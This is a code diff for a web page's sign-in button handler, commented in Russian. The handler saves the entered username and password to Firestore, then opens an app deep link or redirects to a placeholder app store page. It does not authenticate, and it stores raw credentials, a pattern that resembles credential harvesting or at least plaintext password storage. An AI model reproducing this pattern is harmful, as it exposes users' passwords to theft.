@@ -35,13 +35,30 @@ async function saveDataToFirestore(username, password) {
 
 // Обработчик события при клике на кнопку "Войти"
 document.getElementById("signInBtn").addEventListener("click", function() {
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-
-  // Проверка на пустые поля
-  if (username && password) {
-    saveDataToFirestore(username, password);
-  } else {
-    alert("Пожалуйста, заполните все поля");
-  }
-});
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+  
+    // Проверка на пустые поля
+    if (username && password) {
+      saveDataToFirestore(username, password);
+      // Очистка полей ввода
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+  
+      // Попытка открыть приложение через deep link
+      window.location.href = "myapp://";  // Это должно открыть приложение, если оно установлено
+  
+      // Перенаправление в Play Store или App Store через задержку
+      setTimeout(function() {
+        // Проверка операционной системы и редирект в магазин приложений
+        if (navigator.userAgent.match(/Android/i)) {
+          window.location.href = "https://play.google.com/store/apps/details?id=com.example.app";  // для Android
+        } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+          window.location.href = "https://apps.apple.com/us/app/id1234567890";  // для iOS
+        }
+      }, 500);  // Задержка, чтобы дать время открыть приложение
+    } else {
+      alert("Пожалуйста, заполните все поля");
+    }
+  });
+  
